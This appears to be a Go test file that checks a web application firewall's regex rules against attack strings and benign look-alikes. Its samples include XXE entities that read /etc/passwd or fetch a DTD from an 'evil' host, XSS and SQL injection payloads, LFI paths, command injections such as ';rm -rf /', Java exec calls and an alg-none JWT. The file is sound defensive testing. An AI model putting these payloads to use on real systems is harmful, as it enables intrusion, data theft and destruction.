package rules_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"testing"
)

// Bundle-level regex checks for the rules-audit part 3 fixes. These run the
// shipped bundle patterns directly (no Caddy wiring) to pin that the specific
// bypasses the audit found are closed and that the prose/benign inputs that
// used to false-positive no longer match.

func loadPatterns(t *testing.T, file string) map[string]*regexp.Regexp {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "rules", file))
	if err != nil {
		// running from within rules/ during `go test ./...`
		data, err = os.ReadFile(file)
	}
	if err != nil {
		t.Fatalf("read %s: %v", file, err)
	}
	var rules []struct {
		ID      string `json:"id"`
		Pattern string `json:"pattern"`
	}
	if err := json.Unmarshal(data, &rules); err != nil {
		t.Fatalf("unmarshal %s: %v", file, err)
	}
	out := map[string]*regexp.Regexp{}
	for _, r := range rules {
		re, err := regexp.Compile(r.Pattern)
		if err != nil {
			t.Fatalf("%s: rule %q does not compile: %v", file, r.ID, err)
		}
		out[r.ID] = re
	}
	return out
}

func mustMatch(t *testing.T, re *regexp.Regexp, id string, samples ...string) {
	t.Helper()
	if re == nil {
		t.Fatalf("rule %q not found", id)
	}
	for _, s := range samples {
		if !re.MatchString(s) {
			t.Errorf("%s must match %q", id, s)
		}
	}
}

func mustNotMatch(t *testing.T, re *regexp.Regexp, id string, samples ...string) {
	t.Helper()
	if re == nil {
		t.Fatalf("rule %q not found", id)
	}
	for _, s := range samples {
		if re.MatchString(s) {
			t.Errorf("%s must NOT match %q", id, s)
		}
	}
}

func TestXXEBypassesClosed(t *testing.T) {
	p := loadPatterns(t, "xxe.json")
	mustMatch(t, p["xxe-doctype-declaration"], "xxe-doctype-declaration",
		`<!DOCTYPE foo[`, `<!DOCTYPE foo [`, `<!DOCTYPE foo SYSTEM "http://evil/x.dtd">`)
	mustNotMatch(t, p["xxe-doctype-declaration"], "xxe-doctype-declaration", `<!DOCTYPE html>`)
	mustMatch(t, p["xxe-system-entity"], "xxe-system-entity",
		`SYSTEM 'file:///etc/passwd'`, `SYSTEM "file:///etc/passwd"`)
	mustMatch(t, p["xxe-external-dtd"], "xxe-external-dtd",
		`<!ENTITY % xxe SYSTEM "http://evil/x.dtd">`, `<!ENTITY xxe SYSTEM 'http://evil/'>`)
}

func TestXSSBypassesClosed(t *testing.T) {
	p := loadPatterns(t, "xss.json")
	mustMatch(t, p["xss-svg-onload"], "xss-svg-onload", `<svg/onload=alert(1)>`, `<svg onload=alert(1)>`)
	mustMatch(t, p["xss-img-onerror"], "xss-img-onerror", `<img/src=x/onerror=alert(1)>`)
	mustMatch(t, p["xss-event-handlers-on"], "xss-event-handlers-on",
		`<details open ontoggle=alert(1)>`, `<body onpointerdown=confirm(1)>`)
	mustMatch(t, p["xss-alert-function"], "xss-alert-function", `confirm(document.domain)`, `prompt(1)`)
	mustNotMatch(t, p["xss-eval-function"], "xss-eval-function", `retrieval(cached)`, `medieval (12th c.)`)
	mustNotMatch(t, p["xss-alert-function"], "xss-alert-function", `please confirm (by clicking)`)
}

func TestSQLiBypassesClosed(t *testing.T) {
	p := loadPatterns(t, "sql-injection.json")
	mustMatch(t, p["sqli-union-select"], "sqli-union-select", `union(select 1,2)`, `UNION ALL SELECT`)
	mustMatch(t, p["sqli-boolean-logic"], "sqli-boolean-logic", `" or 1=1--`, `' OR '1'='1`)
	mustMatch(t, p["sqli-time-based-functions"], "sqli-time-based-functions", `WAITFOR DELAY '0:0:10'`)
	mustMatch(t, p["sqli-advanced-blind-injection"], "sqli-advanced-blind-injection",
		`select x from y where a='b' or 2=2`)
}

func TestLFIBypassesClosed(t *testing.T) {
	p := loadPatterns(t, "lfi.json")
	mustMatch(t, p["lfi-windows-sensitive-files"], "lfi-windows-sensitive-files",
		`c:\windows\win.ini`, `c:\windows\system32\config\sam`)
	mustMatch(t, p["lfi-apache-config"], "lfi-apache-config", `/etc/httpd/conf/httpd.conf`)
	mustNotMatch(t, p["lfi-common-sensitive-files"], "lfi-common-sensitive-files", `/boot/grubXcfg`)
}

func TestRCESeparatorFix(t *testing.T) {
	p := loadPatterns(t, "rce.json")
	mustMatch(t, p["rce-command-separators"], "rce-command-separators", `;rm -rf /`, `|cat /etc/passwd`)
}

func TestDeserializationFixes(t *testing.T) {
	p := loadPatterns(t, "insecure-deserialization.json")
	mustMatch(t, p["deserial-java-serialized"], "deserial-java-serialized", `rO0AB`, `aced0005`, `ACED0005`)
	mustMatch(t, p["deserial-php-serialized"], "deserial-php-serialized", `O:11:"App\Models\User":`, `C:4:"Evil":`)
	mustMatch(t, p["deserial-yaml-payload"], "deserial-yaml-payload", `key: !!python/object/apply:os.system`)
	mustMatch(t, p["deserial-json-custom"], "deserial-json-custom", `"__proto__" :`)
}

func TestAuthJWTAlgNone(t *testing.T) {
	p := loadPatterns(t, "authentication.json")
	// base64url of {"alg":"none",...}
	mustMatch(t, p["auth-jwt-alg-none"], "auth-jwt-alg-none",
		"Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.")
	mustNotMatch(t, p["auth-jwt-alg-none"], "auth-jwt-alg-none",
		"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.sig")
}

// Salvaged coverage: the deleted rce-java-exec (broken) and rce-os-info-commands
// (unanchored 'ver' FP) targeted real threats. They were rewritten rather than
// dropped; these pin the recovered coverage.
func TestSalvagedRCECoverage(t *testing.T) {
	p := loadPatterns(t, "rce.json")
	mustMatch(t, p["rce-java-exec"], "rce-java-exec",
		`Runtime.getRuntime().exec("cmd /c calc")`, `new ProcessBuilder("bash","-c","id")`)
	mustNotMatch(t, p["rce-java-exec"], "rce-java-exec", `the ProcessBuilder pattern in Java`)
	mustMatch(t, p["rce-command-separators"], "rce-command-separators",
		`;uname -a`, `|systeminfo`, `;hostname`)
	mustNotMatch(t, p["rce-command-separators"], "rce-command-separators", `username=alice`)
}
